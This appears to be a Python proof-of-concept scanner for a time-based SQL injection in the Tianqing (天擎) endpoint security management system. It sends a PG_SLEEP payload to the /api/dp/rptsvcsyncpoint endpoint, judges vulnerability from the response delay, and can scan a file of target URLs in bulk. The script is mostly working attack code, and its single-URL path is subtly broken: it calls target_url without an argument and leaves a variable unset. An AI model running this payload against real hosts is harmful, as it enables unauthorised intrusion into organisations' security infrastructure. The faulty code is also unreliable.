import requests
import time
import sys,getopt
import urllib3
urllib3.disable_warnings()

def title():
    print("[-------------------------------------------------]")
    print("[------- 天擎终端安全管理系统SQL注入漏洞  --------]")
    print("[--------   use: python3 tianqingSQL.py  ---------]")
    print("[--------        Author: Henry4E36         -------]")
    print("[-------------------------------------------------]")

def commit():
    url = ""
    try:

        opt, agrs = getopt.getopt(sys.argv[1:], "hu:f:", ["help", "url=","file="])
        for op, value in opt:
            if op == "-h" or op == "--help":
                print("""
            [-]   天擎终端安全管理系统SQL注入漏洞 
            [-]   Options:
                     -h or --help      :   方法说明
                     -u or --url=      :   站点URL地址
                     -f or --file=     :   批量文件检测
                """)
                sys.exit(0)
            elif op == "-u" or op == "--url=":
                url = value
            elif op == "-f" or op == "--file=":
                file = value
            else:
                print("[-] 参数有误! eg:>>> python3 tianqingSQL.py -u http://127.0.0.1")
                sys.exit(0)
        return url ,file

    except Exception as e:
        print("[-] 参数有误! eg:>>> python3 tianqingSQL.py -u http://127.0.0.1")
        sys.exit(0)

def target_url(url):
    target_url = url +"/api/dp/rptsvcsyncpoint?ccid=1"
    sql_url = url + "/api/dp/rptsvcsyncpoint?ccid=1%27;SELECT%20PG_SLEEP(1)--"
    try:
        start_time = time.time()
        res = requests.get(url=target_url,verify=False,timeout=5)
        end_time = time.time()
        time_res = end_time - start_time
        sql_start = time.time()
        # 这里存在7秒的延迟，故timeout设置10秒
        sql_res = requests.get(url=sql_url,verify=False,timeout=10)
        sql_end = time.time()
        time_sql = sql_end - sql_start
        times = time_sql - time_res
        if times > 5.0 and times < 8.0:
            print(f"\033[31m[!]  系统: {url} 存在SQL注入\033[0m")
        else:
            print(f"[!]  系统: {url} 不存在SQL注入")
    except Exception as e:
        print("[!]  连接错误")

def scans(file):
    try:
        with open(f"{file}","r") as urls:
            for url in urls:
                if url[:4] != "http":
                    url = "http://" + url
                url = url.strip()
                target_url(url)
        urls.close()
    except Exception as e:
        print("[-] 文件不存在")


if __name__ == "__main__":
    title()
    url, file = commit()
    if url != "" and file != "":
        print("[-] 参数有误! eg:>>> python3 tianqingSQL.py -u http://127.0.0.1")
    elif url != "":
        target_url()
    elif file != "":
        scans(file)

